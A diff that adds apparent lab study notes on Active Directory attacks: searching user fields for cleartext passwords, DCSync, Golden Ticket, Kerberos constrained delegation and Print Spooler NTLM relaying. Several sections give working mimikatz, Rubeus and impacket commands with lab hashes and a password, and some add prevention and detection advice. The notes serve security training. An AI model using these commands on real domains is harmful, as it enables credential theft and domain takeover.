@@ -220,3 +220,119 @@ Technically, there is no way to prevent what users leave behind them in scripts 
 A detection technique is discovering the one-to-many connections, for example, when Invoke-ShareFinder scans every domain device to obtain a list of its network shares. It would be abnormal for a workstation to connect to 100s or even 1000s of other devices simultaneously.
 
 ## Credentials in Object Properties
+### Attack
+A simple PowerShell script can query the entire domain by looking for specific search terms/strings in the Description or Info fields:
+
+```
+Function SearchUserClearTextInformation
+{
+    Param (
+        [Parameter(Mandatory=$true)]
+        [Array] $Terms,
+
+        [Parameter(Mandatory=$false)]
+        [String] $Domain
+    )
+
+    if ([string]::IsNullOrEmpty($Domain)) {
+        $dc = (Get-ADDomain).RIDMaster
+    } else {
+        $dc = (Get-ADDomain $Domain).RIDMaster
+    }
+
+    $list = @()
+
+    foreach ($t in $Terms)
+    {
+        $list += "(`$_.Description -like `"*$t*`")"
+        $list += "(`$_.Info -like `"*$t*`")"
+    }
+
+    Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
+        Where { Invoke-Expression ($list -join ' -OR ') } | 
+        Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet | 
+        fl
+}
+```
+```
+PS C:\Users\bob\Downloads> SearchUserClearTextInformation -Terms "pass"
+```
+
+### Prevention
+- Perform continuous assessments to detect the problem of storing credentials in properties of objects.
+- Educate employees with high privileges to avoid storing credentials in properties of objects.
+- Automate as much as possible of the user creation process to ensure that administrators don't handle the accounts manually, reducing the risk of introducing hardcoded credentials in user objects.
+
+## DCSync
+DCSync is an attack that threat agents utilize to impersonate a Domain Controller and perform replication with a targeted Domain Controller to extract password hashes from Active Directory. The attack can be performed both from the perspective of a user account or a computer, as long as they have the necessary permissions assigned, which are:
+
+- Replicating Directory Changes
+- Replicating Directory Changes All
+
+```
+runas /user:DOMAIN\(Username with Directory Change Privilege) cmd.exe
+```
+```
+C:\Mimikatz>mimikatz.exe
+
+mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator
+```
+It is possible to specify the /all parameter instead of a specific username, which will dump the hashes of the entire AD environment. We can perform pass-the-hash with the obtained hash and authenticate against any Domain Controller.
+
+### Prevention
+The only prevention technique against this attack is using solutions such as the RPC Firewall, a third-party product that can block or allow specific RPC calls with robust granularity. For example, using RPC Firewall, we can only allow replications from Domain Controllers.
+
+### Detection
+Detecting DCSync is easy because each Domain Controller replication generates an event with the ID 4662. We can pick up abnormal requests immediately by monitoring for this event ID and checking whether the initiator account is a Domain Controller.
+
+Since replications occur constantly, we can avoid false positives by ensuring the followings:
+
+- Either the property 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 or 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 is present in the event.
+- Whitelisting systems/accounts with a (valid) business reason for replicating, such as Azure AD Connect (this service constantly replicates Domain Controllers and sends the obtained password hashes to Azure AD).
+
+## Golden Ticket
+First, we need to obtain the password's hash of krbtgt and the SID value of the Domain. We can utilize DCSync from the previous attack to obtain the hash:
+```
+C:\Mimikatz>mimikatz.exe
+mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt
+```
+```
+PS C:\Users\bob\Downloads> powershell -exec bypass
+.\PowerView.ps1
+
+Get-DomainSID
+```
+```
+C:\Mimikatz>mimikatz.exe
+mimikatz # kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
+
+exit
+
+# klist
+```
+
+## Kerberos Constrained Delegation
+```
+import-module  PowerView-main.ps1
+Get-NetUser -TrustedToAuth
+
+.\Rubeus.exe hash /password:Slavi123
+.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
+
+klist
+```
+## Print Spooler & NTLM Relaying
+In this attack path, we will relay the connection to another DC and perform DCSync (i.e., the first compromise technique listed). For the attack to succeed, SMB Signing on Domain Controllers must be turned off.
+
+To begin, we will configure NTLMRelayx to forward any connections to DC2 and attempt to perform the DCSync attack:
+```
+thossa00@htb[/htb]$ impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
+
+python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
+```
+The impact of PrinterBug is that any Domain Controller that has the Print Spooler enabled can be compromised in one of the following ways:
+
+1. Relay the connection to another DC and perform DCSync (if SMB Signing is disabled).
+2. Force the Domain Controller to connect to a machine configured for Unconstrained Delegation (UD) - this will cache the TGT in the memory of the UD server, which can be captured/exported with tools like Rubeus and Mimikatz.
+3. Relay the connection to Active Directory Certificate Services to obtain a certificate for the Domain Controller. Threat agents can then use the certificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).
+4. Relay the connection to configure Resource-Based Kerberos Delegation for the relayed machine. We can then abuse the delegation to authenticate as any Administrator to that machine.
